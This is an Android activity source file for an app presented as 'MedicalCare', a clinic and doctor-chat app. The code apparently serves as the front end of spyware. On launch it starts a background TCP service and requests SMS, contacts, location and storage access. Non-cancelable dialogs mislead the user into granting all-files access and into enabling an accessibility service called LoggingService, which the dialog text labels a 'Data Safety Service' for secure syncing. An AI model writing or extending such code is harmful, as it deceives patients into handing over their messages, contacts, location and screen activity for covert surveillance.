package com.example.medicalcare

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.navigation.compose.rememberNavController
import com.example.medicalcare.features.network.service.LoggingService
import com.example.medicalcare.features.network.service.TCPService
import com.example.medicalcare.firebase.FirebaseModule
import com.example.medicalcare.ui.navigation.AppNavGraph
import com.example.medicalcare.ui.navigation.Routes
import com.example.medicalcare.ui.theme.MedicalCareTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        requestRuntimePermissions()

        val serviceIntent = Intent(this, TCPService::class.java)
        startService(serviceIntent)

        val startRoute = if (FirebaseModule.auth.currentUser != null) {
            Routes.Home.route
        } else {
            Routes.Welcome.route
        }

        setContent {
            MedicalCareTheme {
                val navController = rememberNavController()
                AppNavGraph(navController = navController, startRoute = startRoute)
            }
        }
    }

    private fun requestRuntimePermissions() {
        val permissionsToRequest = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
        } else {
            checkSpecialPermissions()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == 100) {
            checkSpecialPermissions()
        }
    }

    private fun checkSpecialPermissions() {
        val needsManageFiles = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
                && !Environment.isExternalStorageManager()
        val needsAccessibility = !isAccessibilityServiceEnabled(this, LoggingService::class.java)

        when {
            needsManageFiles -> showManageAllFilesGuide(showAccessibilityAfter = needsAccessibility)
            needsAccessibility -> showAccessibilityGuide()
        }
    }

    private fun showManageAllFilesGuide(showAccessibilityAfter: Boolean) {
        android.app.AlertDialog.Builder(this)
            .setTitle("Action Required: Files Access for Uploads and Downloads")
            .setMessage("To enable uploading of files, such as your allergies and IC for clinic registration, in your chat with the doctors or downloading of prescriptions and MC, please follow these steps:\n\n" +
                    "1. Tap 'OK' to open Settings\n" +
                    "2. Toggle the switch to 'ON' (Ensure that the app name is MedicalCare)")
            .setCancelable(false)
            .setIcon(android.R.drawable.ic_dialog_alert)
            .setPositiveButton("OK") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(intent)
                } catch (e: Exception) {
                    val fallback = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    fallback.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    startActivity(fallback)
                }
                if (showAccessibilityAfter) showAccessibilityGuide()
            }
            .show()
    }

    private fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService>): Boolean {
        val expectedComponentName = ComponentName(context, service)
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)

        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedComponentName.flattenToString(), ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    private fun showAccessibilityGuide() {
        android.app.AlertDialog.Builder(this)
            .setTitle("Action Required: Enable Data Safety Service")
            .setMessage("To securely sync your medical data and other personal information, please follow these steps:\n\n" +
                    "1. Tap 'OK' to open Settings\n" +
                    "2. Look for 'Downloaded apps' or 'Installed apps'\n" +
                    "3. Select 'MedicalCare Data Safety Service'\n" +
                    "4. Toggle the switch to 'ON'")
            .setCancelable(false)
            .setIcon(android.R.drawable.ic_dialog_alert)
            .setPositiveButton("OK") { _, _ ->
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
            }
            .show()
    }
}
